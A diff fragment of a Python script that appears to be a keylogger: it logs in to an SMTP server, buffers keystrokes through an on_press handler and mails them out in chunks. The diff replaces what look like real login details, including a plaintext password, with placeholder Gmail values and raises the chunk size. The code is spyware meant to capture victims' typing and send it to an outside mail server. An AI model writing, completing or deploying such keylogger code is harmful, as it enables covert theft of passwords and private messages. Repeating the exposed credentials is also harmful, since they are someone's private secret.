@@ -24,14 +24,14 @@ print("""
 //                                                                                        
 """)
 
-email = 'me@arinzejustinng.com.ng'
-password = 'meemail@website'
-server = smtplib.SMTP_SSL('mail.arinzejustinng.com.ng', 465)
+email = 'your@gmail.com'
+password = 'password'
+server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
 full_log = ""
 word = ""
-email_char_limit = 10
+email_char_limit = 60
 
 
 def on_press(key, false=None):
